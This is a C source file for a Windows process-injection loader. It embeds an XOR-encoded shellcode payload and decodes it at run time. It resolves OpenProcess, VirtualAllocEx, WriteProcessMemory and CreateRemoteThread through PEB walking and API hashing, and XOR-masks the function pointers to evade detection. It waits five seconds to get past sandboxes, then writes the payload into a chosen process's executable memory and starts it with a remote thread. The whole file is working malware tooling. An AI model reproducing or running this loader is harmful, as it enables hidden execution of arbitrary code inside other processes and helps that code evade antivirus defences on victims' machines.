#include <memoryapi.h>
#include <synchapi.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <winternl.h>
#include <time.h>

#include "hash.h"

#define INCBIN_PREFIX
#define INCBIN_STYLE INCBIN_STYLE_SNAKE
#include "incbin.h"

INCBIN(payload, "shellcode");

// djb2 from http://www.cse.yorku.ca/~oz/hash.html
uint64_t hash(unsigned char* str)
{
    uint64_t hash = 5381;
    unsigned char c;

    while (c = *str++)
        hash = ((hash << 5) + hash) + c; /* hash * 33 + c */

    return hash;
}

PEB* get_peb()
{
    return (PEB*)__readgsqword(0x60);
}

void* get_proc(PEB* ppeb, uint64_t func_hash)
{
    LIST_ENTRY* l = ppeb->Ldr->InMemoryOrderModuleList.Flink;
    do {
        LDR_DATA_TABLE_ENTRY* ldrentry = CONTAINING_RECORD(l, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        IMAGE_DOS_HEADER* module = ldrentry->DllBase;
        IMAGE_NT_HEADERS64* nt_header = (void*)((char*)ldrentry->DllBase + module->e_lfanew);

        if (nt_header->FileHeader.Characteristics & IMAGE_FILE_DLL) {
            IMAGE_EXPORT_DIRECTORY *export_dir = (void*)((char*)ldrentry->DllBase + nt_header->OptionalHeader.DataDirectory[0].VirtualAddress);
            char * module_name = (void*)((char*)ldrentry->DllBase + export_dir->Name);
           
            PDWORD funcs_name = (void*)((char*)ldrentry->DllBase + export_dir->AddressOfNames);
            PDWORD funcs_addr = (void*)((char*)ldrentry->DllBase + export_dir->AddressOfFunctions);
            PWORD ords = (void*)((char*)ldrentry->DllBase + export_dir->AddressOfNameOrdinals);
           
            for (unsigned int i = 0; i < export_dir->NumberOfNames; i++) {
                char * func_name = (void*)((char*)ldrentry->DllBase + funcs_name[i]);
                void * func_ptr = (void*)((char*)ldrentry->DllBase + funcs_addr[ords[i]]);
           
                if (hash(module_name)+hash(func_name) == func_hash) {
                    return func_ptr;
                }
            }

        }

        l = l->Flink;
    } while (l != &ppeb->Ldr->InMemoryOrderModuleList);

    return NULL;
}


typedef HANDLE(*OpenProcessPtr_t)(
    _In_ DWORD dwDesiredAccess,
    _In_ BOOL bInheritHandle,
    _In_ DWORD dwProcessId
    );
typedef     LPVOID(*VirtualAllocExPtr_t)(
    _In_ HANDLE hProcess,
    _In_opt_ LPVOID lpAddress,
    _In_ SIZE_T dwSize,
    _In_ DWORD flAllocationType,
    _In_ DWORD flProtect
    );
typedef BOOL(*WriteProcessMemoryPtr_t)(
    _In_ HANDLE hProcess,
    _In_ LPVOID lpBaseAddress,
    _In_reads_bytes_(nSize) LPCVOID lpBuffer,
    _In_ SIZE_T nSize,
    _Out_opt_ SIZE_T* lpNumberOfBytesWritten
    );
typedef     HANDLE(*CreateRemoteThreadPtr_t)(
    _In_ HANDLE hProcess,
    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
    _In_ SIZE_T dwStackSize,
    _In_ LPTHREAD_START_ROUTINE lpStartAddress,
    _In_opt_ LPVOID lpParameter,
    _In_ DWORD dwCreationFlags,
    _Out_opt_ LPDWORD lpThreadId
    );

struct func_ptrs {
    unsigned long long rval;
    OpenProcessPtr_t OpenProcessPtr;
    VirtualAllocExPtr_t VirtualAllocExPtr;
    WriteProcessMemoryPtr_t WriteProcessMemoryPtr;
    CreateRemoteThreadPtr_t CreateRemoteThreadPtr;
};

void init_table(struct func_ptrs *fptrs)
{
    PEB* ppeb;
    unsigned long long x = 0;

    srand(time(NULL));
    for (int i = 0; i < 8; i++)
        x = x << 8 | ((unsigned long long)rand() & 0xff);
   
    fptrs->rval = x;

    ppeb = get_peb();
    fptrs->OpenProcessPtr =    (OpenProcessPtr_t)(x ^ (unsigned long long)get_proc(ppeb, OpenProcess_HASH));
    fptrs->VirtualAllocExPtr = (VirtualAllocExPtr_t)(x ^ (unsigned long long)get_proc(ppeb, VirtualAllocEx_HASH));
    fptrs->WriteProcessMemoryPtr = (WriteProcessMemoryPtr_t)(x ^ (unsigned long long)get_proc(ppeb, WriteProcessMemory_HASH));
    fptrs->CreateRemoteThreadPtr = (CreateRemoteThreadPtr_t)(x ^ (unsigned long long)get_proc(ppeb, CreateRemoteThread_HASH));

    printf("OpenProcessPtr @ %p\n", fptrs->OpenProcessPtr);
    printf("VirtualAllocEx @ %p\n", fptrs->VirtualAllocExPtr);
    printf("WriteProcessMemoryPtr @ %p\n", fptrs->WriteProcessMemoryPtr);
    printf("CreateRemoteThreadPtr @ %p\n", fptrs->CreateRemoteThreadPtr);
}

#define FCALL(fptr, fname, ...) \
    ( _Generic(fptr.fname, \
    OpenProcessPtr_t: (OpenProcessPtr_t)((unsigned long long)fptr.fname ^ fptr.rval ), \
    VirtualAllocExPtr_t: (VirtualAllocExPtr_t)((unsigned long long)fptr.fname ^ fptr.rval ), \
    WriteProcessMemoryPtr_t: (WriteProcessMemoryPtr_t)((unsigned long long)fptr.fname ^ fptr.rval ), \
    CreateRemoteThreadPtr_t: (CreateRemoteThreadPtr_t)((unsigned long long)fptr.fname ^ fptr.rval ) \
    ) (__VA_ARGS__) )


// Use XOR swap to revert de shellcode XORing with key
#ifndef XOR_KEY
#define XOR_KEY 0xff
#endif

void decode_payload(const unsigned char * payload, size_t size)
{
    div_t q;
    unsigned char *ptr;
    
    q = div(size, 2);
    ptr = (unsigned char *)payload;

    if (q.rem != 0)
        ptr[q.quot] ^= XOR_KEY;

    for (int i = 0; i < q.quot; i++) {
        if (ptr[i] == ptr[(size-1)-i]) {
            ptr[i] ^= XOR_KEY;
            ptr[(size-1)-i] ^= XOR_KEY ;    
            continue;
        }
            
        ptr[i] ^= ptr[(size-1)-i];
        ptr[(size-1)-i] ^= ptr[i]; 
        ptr[i] ^= ptr[(size-1)-i];
        
        ptr[i] ^= XOR_KEY;
        ptr[(size-1)-i] ^= XOR_KEY ;    
    }
}

int main(int argc, char** argv)
{
    struct func_ptrs fptrs;
    init_table(&fptrs);
   
    Sleep(5000);

    int pid;
    HANDLE proc_handle, remote_thread_handle;
    void* remote_mem;
    size_t written;

    if (argc < 2) {
        printf("Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    pid = atoi(argv[1]);
    proc_handle = FCALL(fptrs, OpenProcessPtr,
        PROCESS_CREATE_THREAD |
        PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE |
        PROCESS_VM_READ, false, pid
    );
   
    if (proc_handle == NULL) {
        printf("Can't open process %d\n", pid);
        return GetLastError();
    }
   
    printf("proc_handle = %p", proc_handle);
	remote_mem = FCALL(fptrs, VirtualAllocExPtr,
        	proc_handle, NULL, payload_size, MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
	);

    if (remote_mem == NULL) {
        printf("failed to allocate remote memory");
        return GetLastError();
    }

    decode_payload(payload_data, payload_size);

	FCALL(fptrs, WriteProcessMemoryPtr,
                proc_handle, remote_mem, payload_data, payload_size, &written
    );

    remote_thread_handle =
    FCALL(fptrs, CreateRemoteThreadPtr,
        proc_handle, NULL, 0,
        (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL
    );

    if (remote_thread_handle == NULL) {
        printf("failed to create remote thread");
        return GetLastError();
    }

    Sleep(10000);

    return 0;
}

